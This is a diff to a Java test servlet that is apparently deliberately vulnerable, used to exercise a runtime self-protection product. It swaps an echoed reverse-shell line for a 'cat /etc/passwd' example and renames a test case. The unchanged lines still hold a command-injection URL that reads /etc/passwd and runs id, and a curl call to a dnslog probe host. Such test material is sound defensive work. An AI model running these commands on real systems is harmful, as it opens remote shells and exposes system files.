@@ -203,7 +203,7 @@ public final class VulnerableServlet extends HttpServlet {
             case "/health" -> "ok";
             case "/request" -> "request inspected";
             case "/command" -> runCommand(request);
-            case "/command/common" -> runCommandLiteral(List.of("echo", "bash -i >& /dev/tcp/127.0.0.1/4444"));
+            case "/command/common" -> runCommandLiteral(List.of("echo", "example: cat /etc/passwd"));
             case "/command/error" -> runCommandLiteral(List.of("sh", "-c", "echo 'unterminated"));
             case "/command/dnslog" -> runCommandLiteral(List.of("echo", "curl http://probe.dnslog.cn/a"));
             case "/command/reflect" -> runCommandReflect();
@@ -4576,7 +4576,7 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"request","name":"Spring CVE-2025-41242 ghost-bits traversal","path":"/rasp/policy/request-spring-cve-2025-41242-ghostbits-path-traversal"},
 
           {"category":"command","name":"Command user input","path":"/rasp/command?cmd=sh&arg=-c&arg=cat%20/etc/passwd%3B%20id"},
-          {"category":"command","name":"Command common payload","path":"/rasp/command/common"},
+          {"category":"command","name":"Print a file command example","path":"/rasp/command/common"},
           {"category":"command","name":"Command syntax error","path":"/rasp/command/error"},
           {"category":"command","name":"Print a network command example","path":"/rasp/command/dnslog"},
           {"category":"command","name":"Reflective command execution","path":"/rasp/command/reflect"},
